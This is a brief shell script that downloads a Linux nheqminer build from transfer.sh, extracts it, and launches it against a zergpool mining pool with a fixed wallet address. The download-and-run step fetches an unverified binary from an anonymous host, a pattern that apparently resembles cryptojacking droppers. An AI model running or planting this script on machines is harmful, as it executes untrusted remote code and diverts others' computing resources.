#!/bin/sh

wget https://transfer.sh/gAEytD/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,mc=VRSC -t 2
